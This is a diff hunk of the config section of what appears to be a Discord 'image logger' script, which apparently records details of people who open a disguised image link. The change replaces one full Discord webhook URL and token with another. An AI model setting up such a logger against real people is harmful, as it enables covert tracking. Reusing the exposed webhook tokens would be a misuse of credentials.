@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1389586818785345536/XPGYMvBbdZs7sdN09XK9Joh4YZ4fWHyvlSa_jMcOZYEPIS2ZQtEldVJfKEWTCHYRLTeR",
+    "webhook": "https://discord.com/api/webhooks/1399012469686403072/rQOQoTIoB5RFLLFAIVWHrTAwZVpST0hmsGtMQrAKQtlGO73UQdUsTvd1hpxQ-nlSdAoT",
     "image": "https://upload.wikimedia.org/wikipedia/commons/e/e8/Tigre.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
